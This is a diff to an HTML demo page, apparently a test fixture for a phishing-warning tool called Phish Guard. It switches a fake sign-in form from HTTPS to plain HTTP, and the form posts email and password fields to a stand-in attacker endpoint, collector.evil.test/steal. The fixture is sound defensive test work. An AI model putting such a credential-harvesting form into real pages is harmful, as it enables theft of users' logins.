@@ -15,10 +15,10 @@
 <body>
   <div class="card">
     <h2>Sign in to continue</h2>
-    <!-- DEMO ONLY: this password form posts to a DIFFERENT domain on purpose,
-         which is exactly the behaviour Phish Guard should warn about.
+    <!-- DEMO ONLY: this password form posts to a DIFFERENT domain over plain
+         HTTP on purpose — two high-risk signals Phish Guard should warn about.
          The endpoint is a non-routable example domain; nothing is sent. -->
-    <form action="https://collector.evil.test/steal" method="post">
+    <form action="http://collector.evil.test/steal" method="post">
       <input type="email" placeholder="Email" />
       <input type="password" placeholder="Password" />
       <button type="submit">Sign in</button>
